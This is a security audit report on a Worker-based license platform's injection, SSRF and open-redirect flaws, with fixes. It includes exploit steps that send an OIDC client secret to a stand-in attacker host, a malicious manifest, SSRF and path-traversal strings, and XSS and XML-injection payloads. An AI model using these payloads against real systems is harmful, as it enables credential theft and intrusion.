# R9 — Injection, SSRF, open redirects, untrusted-input sinks

Red-team lane: everywhere untrusted input reaches an **outbound URL**, a **redirect
`Location`**, **HTML**, **XML**, a **KV key**, a **D1 query**, or a **shell string**.

- Repo: `/Users/vlad/.paseo/worktrees/2hzk6ip2/lewd-owl`, branch `lewd-owl` @ `bd26e0b`
- PoC suite: `packages/worker/test/attack/R9-injection.test.ts` — **32/32 passing**
  (`export PATH="$HOME/.local/share/mise/installs/node/22/bin:$PATH"; cd packages/worker; npx vitest run test/attack/R9-injection.test.ts`)
- No source files were modified.

## Headline

The dominant theme in this lane is **a second, undocumented trust boundary**: the contents of a
linked GitHub repo's `.pkey/` manifest. Anyone with **write access to a linked repo** — not a
Polaris Key platform admin, not a product admin — can push a `.pkey/product.yaml` / `.pkey/release.yaml`
change; the signed GitHub webhook (`githubWebhook.ts:96-220`) auto-resyncs it into D1
(`release/resync.ts:143-326`) with **no operator review**. Those manifest values then land, unencoded
and unvalidated, in outbound URL templates.

Three concrete consequences:

1. **R9-01 (Critical/High).** `oidc.issuer` is validated only as "an absolute `http(s)` URL"
   (`shared-manifest/src/index.ts:440-448` → `1082-1089`). It is then used as the base of a
   `POST` **that carries the product's OIDC `client_secret`** (`oidc.ts:710-724`). A repo writer
   points the issuer at their own host and harvests the secret from any anonymous hit on
   `/<product>/auth/callback`. PoC proves the exact request body.
2. **R9-03 (Medium/High).** `release_config.channel_workflow` is interpolated into
   `https://api.github.com/repos/<o>/<r>/actions/workflows/${channel_workflow}/runs?…`
   **unencoded** (`release/index.ts:350`, `:355`) on a request bearing the **GitHub App
   installation token**. `../../../../../repos/victim/private/issues?` retargets it to any
   `api.github.com` resource. `beta_branch` on the _same line_ IS `encodeURIComponent`-wrapped —
   this is an oversight, not a design decision.
3. **R9-04 (Medium).** `parseRepoUrl` (`release/linkRepo.ts:67-80`) accepts `..`, `?` and `:`
   inside `owner`/`repo`, and every `release/github.ts` + `githubApp.ts` URL template
   interpolates them unencoded. `https://github.com/o/..` yields an authenticated
   `GET https://api.github.com/repos/installation` signed with the **GitHub App JWT**.

Secondary: two open redirects (R9-02 anonymous, R9-05 latent), a non-atomic single-use download
token (R9-05b), a `safeReturnTo` policy divergence (R9-06), two unsanitized-output latents
(R9-07/R9-08), and three HTML responses that ship **without any security headers** (R9-11, R9-12c) —
which matters a lot given R1's finding that same-origin XSS ⇒ admin takeover.

**Refuted:** 5 of the 9 seeded hypotheses were wrong or unreachable as stated (see the
[REFUTED](#refuted) section): prototype pollution, KV key injection, SQL injection, stored XSS via
`auth_page_template` (no writer), and XML injection via `descriptionHtml` (no caller).

---

## Severity table

| ID     | Title                                                                                | Severity               | PoC        |
| ------ | ------------------------------------------------------------------------------------ | ---------------------- | ---------- |
| R9-01  | OIDC `client_secret` exfiltration + SSRF via repo-controlled `oidc.issuer`           | **High**               | ✅ 4 tests |
| R9-02  | Unauthenticated open redirect to the manifest-controlled issuer                      | **Medium**             | ✅ 1 test  |
| R9-03  | `channel_workflow` path/query injection on an installation-token request             | **Medium**             | ✅ 3 tests |
| R9-04  | `gh_owner`/`gh_repo` path injection; permissive `parseRepoUrl`                       | **Medium**             | ✅ 2 tests |
| R9-05a | `/download/<token>` 302s to any host in `release_artifacts.source_url`               | **Medium** (latent)    | ✅ 1 test  |
| R9-05b | Single-use download token is read-then-write, not compare-and-swap                   | **Low**                | ✅ 1 test  |
| R9-06  | `safeReturnTo` allows `/manage` on the product flow, denies it on the portal         | **Low**                | ✅ 2 tests |
| R9-07  | `stripMarkdown` is not an HTML sanitizer; raw `<script>` reaches `summary`           | **Low** (latent)       | ✅ 2 tests |
| R9-08  | Appcast CDATA has no `]]>` neutralization                                            | **Info** (unreachable) | ✅ 2 tests |
| R9-11  | `/<p>/mint/<id>/auth` serves stored HTML unauthenticated with **no CSP**             | **Medium** (latent)    | ✅ 2 tests |
| R9-12c | Device-verify HTML page ships with no CSP / `X-Frame-Options`                        | **Low**                | ✅ 1 test  |
| R9-14  | `handleRelease`'s `NotFoundError → 404` mapping never fires (async return-in-`try`)  | **Low**                | ✅ 2 tests |
| R9-15  | `linkRepo` scopes the installation-token KV cache by **repo name**, not product slug | **Low**                | ✅ 1 test  |

---

## R9-01 — OIDC `client_secret` exfiltration + SSRF via repo-controlled `oidc.issuer`

|               |                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**  | **High** — credential theft of a product's OIDC client secret by a non-admin; blind SSRF egress from the Worker.                                                                                                                                                                                                                                                                                                |
| **File:line** | Sink: `packages/worker/src/oidc.ts:710-724` (token POST) and `:743-745` (`createRemoteJWKSet`). Source: `packages/shared-manifest/src/index.ts:440-448` + `:1078-1089` (`urlAt`/`isUrl`), `:737` (`issuer: String(oidcRoot.issuer ?? "")`). Persistence: `packages/worker/src/release/linkRepo.ts:229-241`, `packages/worker/src/release/resync.ts:225-237`. Resolution: `packages/worker/src/oidc.ts:130-179`. |
| **PoC**       | ✅ `R9-01` × 4                                                                                                                                                                                                                                                                                                                                                                                                  |

### The defect

`isUrl()` is the _entire_ issuer validation:

```ts
// packages/shared-manifest/src/index.ts:1082-1089
function isUrl(v: unknown): v is string {
  if (typeof v !== "string") return false;
  try {
    const url = new URL(v);
    return url.protocol === "https:" || url.protocol === "http:";
  } catch {
    return false;
  }
}
```

No host allowlist, no IP-literal rejection, no `https`-only rule, no comparison against the
platform issuer. `http://169.254.169.254/latest/meta-data` passes.

`resolveOidcConfig` then hands that string to `handleAuthCallback`, which POSTs to it:

```ts
// packages/worker/src/oidc.ts:710-724
const tokenRes = await fetch(
  `${oidc.issuer.replace(/\/$/, "")}/api/oidc/token`,
  {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      grant_type: "authorization_code",
      code,
      redirect_uri: flow.redirectUri,
      client_id: oidc.clientId,
      code_verifier: flow.verifier,
      ...(oidc.clientSecret ? { client_secret: oidc.clientSecret } : {}), // ← the secret
    }),
  },
);
```

`oidc.clientSecret` is the KEK-sealed `product_secrets` value the operator supplied out-of-band
(`oidc.ts:142-156`). It is sent, in the clear, to whatever host the manifest named.

The `redirect_uris_json` allowlist (`oidc.ts:223-232`) is **not** a mitigation: it only checks that
_our own_ callback URI is registered. PoC test 4 populates it correctly and the exfiltration still
happens.

### Who can do this

Not a Polaris Key admin. A **repo collaborator**:

1. Operator links `github.com/acme/app` once (`POST /manage/api/products/link-repo`).
2. Attacker (write access to `acme/app`) pushes `.pkey/product.yaml` on the default branch:
   ```yaml
   oidc:
     provider: custom
     issuer: https://exfil.attacker.example
     clientId: djdl
     clientSecretSecret: OIDC_CLIENT_SECRET
   ```
3. GitHub fires `push`; `handleGithubWebhook` (`githubWebhook.ts:96-220`) verifies the HMAC (it is a
   _genuine_ GitHub delivery), sees a `.pkey/` path change (`:144`), and calls `resyncRepo`.
4. `resyncRepo` **deletes and re-inserts** `oidc_config` unconditionally
   (`resync.ts:221-237`) — unlike `fingerprint_policy` / `auto_issue`, the OIDC row has **no
   manifest-vs-admin ownership guard**.
5. Attacker (or any anonymous visitor) hits `GET /<product>/auth/start` to obtain a `state`, then
   `GET /<product>/auth/callback?code=X&state=<state>` — **fully unauthenticated**.

### Exploit steps (as executed by the PoC)

```
GET  /djdl/auth/start                                    → 302 …?state=S
GET  /djdl/auth/callback?code=ATTACKER_CODE&state=S      → worker POSTs:
     POST https://exfil.attacker.example/api/oidc/token
     grant_type=authorization_code&code=ATTACKER_CODE
     &redirect_uri=https%3A%2F%2Fkey.plrs.im%2Fdjdl%2Fauth%2Fcallback
     &client_id=client-djdl&code_verifier=v
     &client_secret=SUPER-SECRET-oidc-client-secret        ← stolen
```

The PoC asserts the exact URL and that the body contains
`client_secret=SUPER-SECRET-oidc-client-secret`.

### Additional impact

- **SSRF primitive.** The same sink reaches `http://169.254.169.254/…` (PoC test 3 asserts the
  literal outbound URL). Cloudflare's runtime blocks most RFC-1918/link-local egress in practice,
  so treat this as _defence-in-depth-gone_ rather than a confirmed IMDS read — the exfiltration to
  a public attacker host is the unambiguous impact.
- **Second sink:** `createRemoteJWKSet(new URL(\`${issuer}/.well-known/jwks.json\`))`
(`oidc.ts:743-745`) — an unauthenticated GET to the same attacker host, reached whenever the
attacker's fake token endpoint returns a well-formed `{id_token}`.
- **Full IdP substitution.** An attacker-controlled issuer _plus_ an attacker-controlled JWKS means
  the attacker mints ID tokens that `jwtVerify` accepts (`iss`/`aud`/`nonce` all check out against
  the attacker's own values), so they can assert **any** `sub`/`groups` and obtain licenses at any
  tier through `activateFromIdentity` (`oidc.ts:286-463`). That escalation is R3's lane but it
  originates here.

### Fix direction

1. Validate the issuer at **ingest** (`shared-manifest`): require `https:`, reject IP literals
   (v4 + v6, including decimal/octal/hex forms), reject `localhost`/`.local`/`.internal`, and
   reject credentials/ports outside 443.
2. Validate it again at the **sink** (`resolveOidcConfig`) — manifests are re-parsed by resync, but
   a direct D1 write is not.
3. Best: an **operator-owned allowlist** of permitted custom issuer hosts, stored outside the
   manifest (a platform-admin-set column or env allowlist), so a repo writer cannot introduce a new
   IdP host at all.
4. Give `oidc_config` the same manifest-vs-admin ownership flag that `fingerprint_policy_source`
   and `auto_issue_source` already have (`resync.ts:160-181`), so a push cannot silently repoint an
   IdP an operator has configured.
5. Never send `client_secret` to a host that was not on the allowlist at the time the secret was
   sealed.

---

## R9-02 — Unauthenticated open redirect to the manifest-controlled issuer

|               |                                                                                                                                                                        |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**  | **Medium** — anonymous open redirect from the platform origin; leaks `client_id` + `redirect_uri`; a clean phishing pivot (the URL is on the real `key.plrs.im` host). |
| **File:line** | `packages/worker/src/oidc.ts:512-526`, `:542-545`; second site `:631-634` (`handleAuthDeviceVerify` 302s to the stored `record.authorizeUrl`).                         |
| **PoC**       | ✅ `R9-02`                                                                                                                                                             |

`GET /<product>/auth/start` builds `new URL(\`${oidc.issuer}/authorize\`)`and 302s to it with no
host check. Same manifest-write precondition as R9-01.`GET /<product>/auth/device/verify?...&confirm=1`
is a second, equally anonymous redirect to the same value.

**Fix:** covered by the R9-01 issuer allowlist. Independently, the device-verify confirm step should
be a `POST` with a CSRF token rather than a `GET` link (it is currently a one-click 302 on a page
with no `X-Frame-Options`; see R9-12c).

---

## R9-03 — `channel_workflow` path/query injection on an installation-token request

|               |                                                                                                                                                                                                                                                                                     |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**  | **Medium** (High if the GitHub App installation is broadly scoped) — server-side request forgery _within_ `api.github.com`, carrying `Authorization: Bearer <installation token>`.                                                                                                  |
| **File:line** | `packages/worker/src/release/index.ts:340`, **`:350`**, **`:355`**, `:358`. Source: `packages/shared-manifest/src/index.ts:753` (`channelWorkflow: String(rel.channelWorkflow ?? "")` — no validation at all). Persistence: `release/linkRepo.ts:285`, `release/resync.ts:202-215`. |
| **PoC**       | ✅ `R9-03` × 3                                                                                                                                                                                                                                                                      |

```ts
// packages/worker/src/release/index.ts:350
runsUrl = `${base}/actions/workflows/${cfg.channel_workflow}/runs?branch=${encodeURIComponent(cfg.beta_branch)}&status=success&per_page=10`;
//                                     ^^^^^^^^^^^^^^^^^^^^^^^ raw          ^^^^^^^^^^^^^^^^^^ encoded
```

`beta_branch` is encoded on the same expression; `channel_workflow` is not. `sel.pr` (`:352`) is a
`Number` and is safe.

**Reachability:** unauthenticated by default. `GET /<product>/cli/beta/<binary>-arm64`,
`/<product>/dmg/beta/<binary>-arm64.dmg`, or `/<product>/beta/appcast.xml` all route to
`resolveSelector` → `channelTagsFor` with `sel.kind === "beta"` (`release/index.ts:337`). Access is
`public` unless the manifest opted into `authenticated`/`licensed` (`release/index.ts:120-145`).

**Verified primitives (PoC):**

| `channel_workflow`                            | Resulting request                                        |
| --------------------------------------------- | -------------------------------------------------------- |
| `../../../../../repos/victim/private/issues?` | `GET https://api.github.com/repos/victim/private/issues` |
| `wf.yml/runs?actor=evil&`                     | injects arbitrary query parameters                       |

The scheme+host prefix is fixed, so the **host cannot be changed** — this is confined to
`api.github.com`, `GET`-only, with a blind (404-vs-500) oracle. Impact is proportional to the App
installation's scopes: enumeration of private repos/issues/contents the installation can read, and
metadata for other repos in the same installation.

**Fix:** `encodeURIComponent(cfg.channel_workflow)`, and validate at ingest with something like
`/^[A-Za-z0-9._-]{1,100}\.ya?ml$/` (a workflow file name). Add the same guard to the manifest
parser so a bad value never reaches D1.

---

## R9-04 — `gh_owner` / `gh_repo` path injection; permissive `parseRepoUrl`

|               |                                                                                                                                                                                                                                                                                         |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**  | **Medium** — authenticated request forgery on `api.github.com`, including one signed with the **GitHub App JWT** (a stronger credential than an installation token). Requires platform admin to _introduce_, but the values then persist and are used on unauthenticated public routes. |
| **File:line** | `packages/worker/src/release/linkRepo.ts:67-80` (`parseRepoUrl`); unencoded sinks: `release/githubApp.ts:148-153`, `release/github.ts:60`, `:80`, `:118`, `:177`, `:207`.                                                                                                               |
| **PoC**       | ✅ `R9-04` × 2                                                                                                                                                                                                                                                                          |

```ts
// release/linkRepo.ts:75-77
const m =
  trimmed.match(/github\.com[/:]([^/]+)\/([^/]+)$/i) ??
  trimmed.match(/^([A-Za-z0-9._-]+)\/([A-Za-z0-9._-]+)$/);
```

The _bare_ `owner/repo` form is properly character-classed. The `github.com/…` form is `[^/]+` —
it accepts `..`, `?`, `#`, `:`, `%`, `@`, spaces. The parsed values go straight into
`https://api.github.com/repos/${owner}/${repo}/installation` (`githubApp.ts:149`) with the App JWT,
and are then persisted into `release_config` and reused by every `release/github.ts` call.

PoC results:

```
parseRepoUrl("https://github.com/o/..")           → { owner: "o", repo: ".." }
  ⇒ GET https://api.github.com/repos/installation            (App JWT)
parseRepoUrl("https://github.com/o/r?per_page=1") → { owner: "o", repo: "r?per_page=1" }
parseRepoUrl("https://github.com/a:b/c:d")        → { owner: "a:b", repo: "c:d" }

release_config.gh_repo = ".."  ⇒  GET /repos/acme/../releases?per_page=100
                                  normalizes to /repos/releases       (installation token)
```

Note `fetchRepoFile` (`github.ts:177-180`) _does_ segment-encode its `path` argument — so the
encoding discipline exists in the file; it just was not applied to `owner`/`repo`.

**Fix:** tighten `parseRepoUrl` to `[A-Za-z0-9._-]+` for both captures on **every** branch, and
`encodeURIComponent` owner/repo at each URL template.

---

## R9-05a — `/download/<token>` 302s to any host in `release_artifacts.source_url`

|               |                                                                                                                                                                                                                                                                        |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**  | **Medium**, currently **latent** (no production writer for `release_artifacts` exists in-tree — the table is only written by tests). Reportable because the _sink_ is live and reachable, and the schema is clearly intended to be populated by a release-ingest path. |
| **File:line** | `packages/worker/src/portal/api.ts:679-687`. Contrast: `packages/worker/src/release/github.ts:88-95` + `:124-127` (which _does_ allowlist redirect targets).                                                                                                           |
| **PoC**       | ✅ `R9-05`                                                                                                                                                                                                                                                             |

```ts
// packages/worker/src/portal/api.ts:679-687
return new Response(null, {
  status: 302,
  headers: portalSecurityHeaders(
    new Headers({
      location: artifact.source_url, // ← straight from D1, no host allowlist
      "cache-control": "no-store",
    }),
  ),
});
```

The Worker already has the right helper two files away (`isAllowedStorageHost`), and the module
docstring for `release/index.ts` even advertises "Storage-redirect re-fetches are SSRF-guarded to
GitHub's own hosts" — the portal download path does not inherit that guard. Because the redirect
comes from an authenticated portal session on the platform origin, a poisoned `source_url` is a
credible malware-delivery vector ("download your licensed build").

**Fix:** allowlist the redirect host (reuse/lift `isAllowedStorageHost`, or gate on an
operator-configured artifact CDN host), and require `https:`.

## R9-05b — Single-use download token is read-then-write, not compare-and-swap

|               |                                                                                                                 |
| ------------- | --------------------------------------------------------------------------------------------------------------- |
| **Severity**  | **Low**                                                                                                         |
| **File:line** | `packages/worker/src/portal/api.ts:649` (check) vs `:678` (mark); `packages/worker/src/portal/repo.ts:619-631`. |
| **PoC**       | ✅ `R9-05` (deterministic, with a one-turn write delay modelling D1 latency)                                    |

```ts
if (!row || row.expires_at <= now || row.used_at != null) return notFound();   // :649
… six more awaits (artifact, settings, account, two license scans) …
await markPortalDownloadUsed(db, row.product, row.token_hash, now);            // :678
```

and the mark is an unguarded UPDATE:

```sql
-- portal/repo.ts:626
UPDATE release_download_tokens SET used_at = ? WHERE product = ? AND token_hash = ?
```

Any number of requests that pass `:649` before the first write lands all get a 302. Impact is
bounded (the token is 5-minute, account-scoped, and every authz check is re-run), so this is a
correctness/abuse issue rather than an authz bypass.

**Fix:** make it a CAS — `… WHERE product = ? AND token_hash = ? AND used_at IS NULL`, check the
affected-row count, and 404 when it is 0. Mark **before** emitting the redirect and before the
expensive license scans.

---

## R9-06 — `safeReturnTo` policy divergence between the product flow and the portal

|               |                                                                                       |
| ------------- | ------------------------------------------------------------------------------------- |
| **Severity**  | **Low**                                                                               |
| **File:line** | `packages/worker/src/oidc.ts:205-215` vs `packages/worker/src/portal/auth.ts:94-105`. |
| **PoC**       | ✅ `R9-06` × 2                                                                        |

The two functions are otherwise identical twins; the portal copy has one extra line:

```ts
if (parsed.pathname.startsWith("/manage")) return undefined; // portal/auth.ts:100 — absent in oidc.ts
```

So `GET /<product>/auth/start?return_to=https://key.plrs.im/manage/api/products` is accepted, and
on success the worker 302s there **while setting a product browser-session cookie**
(`oidc.ts:806-812`). The same value is rejected with a 400 by `GET /login`. Same-origin, so this is
not an open redirect; it is an inconsistent-policy smell and a landing-page confusion vector on the
admin surface.

**Refuted sub-claim (PoC):** the origin comparison itself is sound. `https://evil.example/`,
`//evil.example/`, `https://key.plrs.im.evil.example/`, `javascript:alert(1)` and
`https:/\evil.example/` are all rejected by both copies.

**Origin derivation (as asked).** Every `redirectUri` and every `safeReturnTo` comparison derives
from `new URL(req.url).origin`, i.e. the **Host header**:

| Site                        | Expression                                                       |
| --------------------------- | ---------------------------------------------------------------- |
| `oidc.ts:503`               | `` `${new URL(req.url).origin}/${product.slug}/auth/callback` `` |
| `oidc.ts:589`, `:598`       | device verification + poll URLs                                  |
| `oidc.ts:209`               | `safeReturnTo` comparison base                                   |
| `portal/auth.ts:194`        | `` `${url.origin}/callback` ``                                   |
| `portal/auth.ts:98`, `:349` | `safeReturnTo` base, magic-link verify URL                       |
| `admin/auth.ts:166`         | `` `${new URL(req.url).origin}/manage/callback` ``               |
| `release/index.ts:185`      | `origin` → install script + appcast enclosure URLs               |
| `jwks.ts:37-38`             | `jwksUrl` inside the **JWS-signed trust manifest**               |
| `discovery.ts:24`, `:83`    | `.well-known/polaris.json` `baseUrl`                             |

On Cloudflare the Host is constrained to hostnames routed to the Worker, so this is not directly
attacker-controlled. But it does mean: **any additional hostname routed to this Worker (a
`*.workers.dev` preview, a staging CNAME) becomes a valid `return_to` target and gets embedded in
signed trust manifests.** Consider pinning the origin from a `PUBLIC_ORIGIN` binding rather than the
request.

**Fix:** extract one shared `safeReturnTo` (single implementation, single policy), and pin the
comparison origin to configuration.

---

## R9-07 — `stripMarkdown` is not an HTML sanitizer

|               |                                                                                                                                                              |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Severity**  | **Low** (latent — no in-repo HTML consumer today)                                                                                                            |
| **File:line** | `packages/worker/src/release/changelog.ts:38-45` (`stripMarkdown`), `:56-77` (`extractSummary`); consumed at `packages/worker/src/release/index.ts:455-467`. |
| **PoC**       | ✅ `R9-07` × 2                                                                                                                                               |

```ts
function stripMarkdown(s: string): string {
  return s
    .replace(/\[([^\]]+)\]\([^)]*\)/g, "$1")
    .replace(/[*_`]+/g, "")
    .replace(/^\s*[-*+]\s+/gm, "")
    .replace(/^\s*#{1,6}\s+/gm, "")
    .trim();
}
```

Nothing here touches `<`, `>` or `&`. A GitHub release body containing
`<img src=x onerror=alert(document.domain)><script>fetch('//evil')</script>` inside the
`<!-- pkey:summary -->` block survives verbatim into `entries[].summary`.

**Trace of every `summary` consumer:**

| Consumer                                   | Sink                                                                                             |
| ------------------------------------------ | ------------------------------------------------------------------------------------------------ |
| `release/index.ts:461` → `handleChangelog` | `json({entries})` — `application/json`, `nosniff` not set on this route but content-type is JSON |
| `packages/admin/src/api.ts:489`            | typed as `summary: string` — the admin SPA is React (auto-escaping)                              |
| Portal SPA                                 | consumes `release_metadata.notes`, **not** `summary`                                             |
| `release_metadata.notes` / `title`         | no production writer in-tree                                                                     |

So today the string only ever lands in JSON and in React text nodes. The hazard is that the function
_name_ and the `/changelog` shape both invite an operator or SDK author to render it as HTML.

**Fix:** either HTML-escape in `cap()`, or rename to `stripMarkdownSyntax` and document loudly that
the output is **untrusted HTML** and must be escaped by consumers. Emitting the raw body plus a
sanitized `summaryText` would be clearer still.

---

## R9-08 — Appcast CDATA has no `]]>` neutralization (unreachable today)

|               |                                                                                                        |
| ------------- | ------------------------------------------------------------------------------------------------------ |
| **Severity**  | **Info** — the sink is dead code as wired.                                                             |
| **File:line** | `packages/worker/src/release/appcast.ts:64-67`; caller `packages/worker/src/release/index.ts:581-583`. |
| **PoC**       | ✅ `R9-08` × 2                                                                                         |

```ts
const desc = item.descriptionHtml
  ? `\n      <description><![CDATA[${item.descriptionHtml}]]></description>` // no ]]> escaping
  : "";
```

Everything else in the renderer goes through `xmlEscape` (`:49-58`, which correctly covers
`& < > " '`). The PoC injects `ok]]></description><enclosure url='https://evil'/><description><![CDATA[`
and gets a sibling `<enclosure>` into the feed — i.e. a Sparkle update pointed at an attacker URL.

`handleAppcast` only ever passes `{ title }` (`index.ts:581-583`), so `descriptionHtml` is never
set. The PoC asserts that `release/index.ts` contains no `descriptionHtml` reference at all.

**Fix (pre-emptive):** in `renderItem`, replace `]]>` with `]]]]><![CDATA[>` before embedding, or
drop CDATA and `xmlEscape` the description like every other field.

---

## R9-11 — `/<product>/mint/<id>/auth` serves stored HTML unauthenticated with no CSP

|               |                                                                                                                                        |
| ------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**  | **Medium** (latent) — the _route_ is live and header-less; only the absence of a writer for the column keeps it from being stored XSS. |
| **File:line** | `packages/worker/src/edgeMint.ts:246-258`. Column: `packages/worker/migrations/0001_init.sql:168`.                                     |
| **PoC**       | ✅ `R9-11` × 2                                                                                                                         |

```ts
export async function handleMintAuth(db, product, mintId) {
  const cfg = await getEdgeMintConfig(db, product.slug, mintId);
  if (!cfg || !cfg.auth_page_template) return errorResponse(404, …);
  return new Response(cfg.auth_page_template, {
    status: 200,
    headers: { "content-type": "text/html; charset=utf-8" },   // ← nothing else
  });
}
```

Contrast `handleMintToken` immediately above it, which requires a valid device bearer token
(`edgeMint.ts:185-189`) and rate-limits. `handleMintAuth` takes **no `req` argument at all** — it
cannot authenticate even if it wanted to.

**Who can write the column — answer: nobody, today.** The only INSERT touching
`auth_page_template` hardcodes `NULL`:

```sql
-- packages/worker/src/repo.ts:591-592
INSERT INTO edge_mint_config (…, ttl_seconds, audience, auth_page_template)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, NULL)
```

No admin handler, no manifest field (`ManifestEdgeMint` has no `authPage`), no migration seed. It is
reachable only via direct D1 access. **Verified by PoC.**

**What a script there could reach.** This matters because of R1's finding: a script on the platform
origin can `fetch("/manage/api/me", {credentials:"same-origin"})`, read the per-session CSRF token
out of the JSON body, and drive every admin mutation. `Path=/manage` + `SameSite=Strict` +
`HttpOnly` do not contain a same-origin script. It could equally read `/api/me`, mint portal
download tokens, and call `/<product>/config`.

**Fix:** (a) apply `appSecurityHeaders()` to this response — it is an HTML document on the platform
origin and there is no reason for it to be the one response without a CSP; (b) if the column is
ever wired up, treat it as templated data, not raw HTML (allowlisted placeholders only), and serve
it from a **separate origin** (`*.mintauth.example`) so it is outside the platform's same-origin
blast radius; (c) if it is not going to be wired up, delete the column and the handler.

---

## R9-12 — `escapeHtml` omits `'`; three HTML responses have no security headers

|               |                                                                                                                                                                           |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**  | **Low**                                                                                                                                                                   |
| **File:line** | `packages/worker/src/oidc.ts:602-608`, `packages/worker/src/portal/email.ts:11-17`; header-less responses at `oidc.ts:657-660`, `oidc.ts:817-820`, `edgeMint.ts:254-257`. |
| **PoC**       | ✅ `R9-12` × 3                                                                                                                                                            |

Both `escapeHtml` copies escape `& < > "` and **not** `'`. I traced **every** interpolation:

| Site                                                  | Context                                                                                   | Safe?                                                                               |
| ----------------------------------------------------- | ----------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| `oidc.ts:643,647` `escapeHtml(product.name)`          | `<title>` / `<h1>` text node                                                              | ✅                                                                                  |
| `oidc.ts:650` `escapeHtml(record.userCode)`           | `<dd>` text node                                                                          | ✅                                                                                  |
| `oidc.ts:651` `escapeHtml(deviceLabel)`               | `<dd>` text node                                                                          | ✅ (`deviceName` is attacker-supplied at `/auth/device/start`, sliced to 120 chars) |
| `oidc.ts:652` `escapeHtml(product.slug)`              | `<dd>` text node; slug is `[a-z0-9-]+` anyway                                             | ✅                                                                                  |
| `oidc.ts:654` `escapeHtml(confirmUrl.toString())`     | `href="…"` — **double**-quoted; `URLSearchParams` percent-encodes `"` to `%22` regardless | ✅                                                                                  |
| `portal/email.ts:31` `escapeHtml(link)`               | `href="…"` — double-quoted, server-built URL                                              | ✅                                                                                  |
| `portal/email.ts:48` `escapeHtml(text)`               | `<p>` text node                                                                           | ✅                                                                                  |
| `portal/auth.ts:41`, `admin/auth.ts:140` `${message}` | **unescaped** into `<h1>`                                                                 | ✅ — every one of the 20 call sites passes a string literal (verified)              |

**Verdict: no exploitable XSS today.** But the helper is one copy-paste from a single-quoted
attribute away from being one, and it is duplicated in two files.

**R9-12c (the real sub-finding):** the device-verify page (`oidc.ts:657-660`), the "You're signed
in" page (`oidc.ts:817-820`) and the mint-auth page (`edgeMint.ts:254-257`) all return HTML with
**no CSP, no `X-Frame-Options`, no `nosniff`** — while `appSecurityHeaders()` exists and is applied
everywhere else. The device-verify page is a one-click "Continue to sign in" 302 with no frame
protection: framable clickjacking against a device-authorization confirmation.

**Fix:** one shared `escapeHtml` that also emits `&#39;` (and `&#x60;`), plus
`appSecurityHeaders()` on all three responses.

---

## R9-14 — `handleRelease`'s `NotFoundError → 404` mapping never fires

|               |                                                                                               |
| ------------- | --------------------------------------------------------------------------------------------- |
| **Severity**  | **Low** — availability + a 404-vs-500 information oracle on a documented "clean 404" surface. |
| **File:line** | `packages/worker/src/release/index.ts:197-259`.                                               |
| **PoC**       | ✅ `R9-14` × 2                                                                                |

```ts
try {
  switch (kind) {
    case "install":  return handleInstall(cfg, product, origin);   // sync — fine
    case "version":  return handleVersion(env, db, cfg, …);        // async — NOT awaited
    …
  }
} catch (err) {
  if (err instanceof NotFoundError) return notFound();             // dead for every async branch
  throw err;
}
```

`return <promise>` inside a `try` in an `async` function does **not** route rejections through the
enclosing `catch` (the implicit await happens after the `try` block exits). Every `NotFoundError`
thrown by `resolveSelector` / `streamAsset` / `channelTagsFor` escapes as an unhandled rejection →
the Worker 500s instead of 404ing. PoC asserts `rejects.toThrow(/no release for selector/)`, and
that only the synchronous `!cfg` guard produces a real 404.

Side effect: the module's stated privacy property ("callers never reveal that a repo is private or
that a token exists", `github.ts:8-10`) is broken — 404 means _no release config_, 500 means
_config exists but the GitHub lookup failed_.

**Fix:** `return await handleVersion(…)` (etc.), or wrap the switch in an `await (async () => …)()`.

---

## R9-15 — `linkRepo` scopes the installation-token KV cache by repo name, not product slug

|               |                                                                                                                                                                   |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**  | **Low** — violates the "every KV key is product-scoped" invariant stated in `kv.ts:1-3`.                                                                          |
| **File:line** | `packages/worker/src/release/linkRepo.ts:123`; key builder `packages/worker/src/kv.ts:8-10`; cache read/write `packages/worker/src/release/githubApp.ts:210-237`. |
| **PoC**       | ✅ `R9-15`                                                                                                                                                        |

```ts
// linkRepo.ts:122-123
installId = await discoverInstallation(env, owner, repo, now, fetchImpl);
token = await getInstallationToken(env, repo, installId, now, fetchImpl);
//                                          ^^^^ this parameter is `product` — used as pk()'s scope
```

Every other caller (`release/index.ts:269-275`, `resync.ts:97` — which also passes `repo`) is
inconsistent. Result: the cache key is `p:<repoName>:gh-token:<installId>` instead of
`p:<slug>:gh-token:<installId>`. Two consequences:

1. A repo whose **name equals another product's slug** shares that product's installation-token
   cache slot — cross-tenant credential reuse in a namespace explicitly designed to prevent it.
2. Combined with R9-04, `repo` can contain `:` (`https://github.com/x/a:b` → `repo = "a:b"`), so the
   key becomes `p:a:b:gh-token:1` — the only way to actually inject a `:` into a KV key in this
   codebase.

**Fix:** pass the product slug (`slug`) in `linkRepo`/`resync`; during link, the slug is only known
after `parseManifest`, so either move the token mint after parsing or use an explicit
`gh-app:<installId>` namespace for a credential that is genuinely installation-scoped, not
product-scoped.

---

<a id="refuted"></a>

## REFUTED

### RF-1 — Prototype pollution via `applyOverrides` (hypothesis 7) — **REFUTED**

`packages/worker/src/admin/lib/overrides.ts:61-66`, PoC `R9-09` × 3.

The precondition is real: catalog PUBLISH (`admin/handlers/schema.ts:34-57`) has **no key-name
allowlist**, so `new Catalog({entries:[{key:"__proto__",…}]})` compiles and
`catalog.entryByKey("__proto__")` resolves. But the write does not pollute:

- `bucket` is `{...current.config}` — a plain object inheriting `Object.prototype`. `bucket["__proto__"] = entry`
